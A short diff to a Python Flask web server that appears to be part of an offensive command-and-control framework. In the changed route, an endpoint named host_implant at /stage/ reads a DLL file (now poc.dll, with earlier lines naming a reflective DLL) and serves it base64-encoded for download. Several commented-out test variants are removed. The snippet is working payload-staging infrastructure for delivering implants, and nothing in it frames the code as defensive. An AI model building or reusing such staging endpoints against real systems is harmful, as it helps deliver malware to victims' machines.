@@ -1,4 +1,5 @@
 import json
+import os
 from uuid import uuid4
 from flask import Flask, jsonify, request, Response
 from database.scripts.schema import TableName
@@ -91,14 +92,8 @@ class WebServer:
 
     @app.route("/stage/", methods=["GET"])
     def host_implant():
-        #f = open("./messagebox.dll", "rb").read()
-        #f = open("./reflective_dll.x64.dll", "rb").read()
-        #f = open("./poc1.dll", "rb").read()
-        #f = open("./poc1.dll", "rb").read()
-        f = open("./poc2.dll", "rb").read()
+        f = open("./poc.dll", "rb").read()
         return b64encode(f)
-        # return Response(bom + "HI THERE".encode('utf-16le'), content_type='text/plain; charset=utf-16le')
-        # return Response("HI THERE", mimetype='text/plain; charset=utf-16')
 
     @staticmethod
     def run():
